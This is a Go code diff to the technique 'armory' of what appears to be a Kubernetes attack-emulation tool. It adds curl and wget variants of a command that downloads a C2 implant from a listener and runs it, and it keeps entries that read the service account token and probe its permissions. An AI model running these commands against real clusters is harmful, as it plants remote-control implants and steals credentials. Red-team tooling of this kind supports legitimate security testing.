@@ -111,7 +111,11 @@ func LoadArmory(dir string) (Armory, error) {
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
 			Tactics:     []domain.Tactic{domain.Execution},
 			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
-			Cmd:      "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
+			// Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
+			CmdVariants: map[string]domain.CmdVariant{
+				"curl": "curl -L $LISTENER:$FILESHARE_PORT/implant -o /tmp/pause && chmod +x /tmp/pause && /tmp/pause &",
+				"wget": "wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &",
+			},
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
 		},
 		{
@@ -119,7 +123,7 @@ func LoadArmory(dir string) (Armory, error) {
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
 			Tactics:     []domain.Tactic{domain.CredentialAccess},
 			Cmd:         "cat",
-			CmdVariants: map[string]string{
+			CmdVariants: map[string]domain.CmdVariant{
 				"sliver": "get_file",
 			},
 			Args:          []string{"/var/run/secrets/kubernetes.io/serviceaccount/token"},
@@ -131,7 +135,7 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:     "Install kubectl",
 			Tactics:  []domain.Tactic{domain.Discovery},
 			Requires: domain.Requirements{Kind: "Pod", AccessLevel: domain.UserExec},
-			CmdVariants: map[string]string{
+			CmdVariants: map[string]domain.CmdVariant{
 				"curl": `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x kubectl && mkdir -p ~/.local/bin && mv ./kubectl ~/.local/bin/kubectl`,
 			},
 		},
@@ -140,7 +144,7 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:     "Check Token permissions",
 			Tactics:  []domain.Tactic{domain.Discovery},
 			Requires: domain.Requirements{Kind: "ServiceAccount"},
-			CmdVariants: map[string]string{
+			CmdVariants: map[string]domain.CmdVariant{
 				// "kubectl":           "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS}",
 				// "kubectl_remote_sa": "kubectl auth can-i --list --token=${TOKEN} --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n ${NS} --as=system:serviceaccount:${NS}:${SA.NAME}",
 				// -H "application/vnd.kubernetes.protobuf,application/json"
@@ -216,6 +220,15 @@ func LoadArmory(dir string) (Armory, error) {
 	return Armory{
 		ttps: ttps,
 	}, nil
+}
+
+func (a Armory) GetTTP(id string) (domain.TTP, bool) {
+	for _, ttp := range a.ttps {
+		if ttp.GetID() == id {
+			return ttp, true
+		}
+	}
+	return domain.TTP{}, false
 }
 
 func (a Armory) GetTTPs() []domain.TTP {
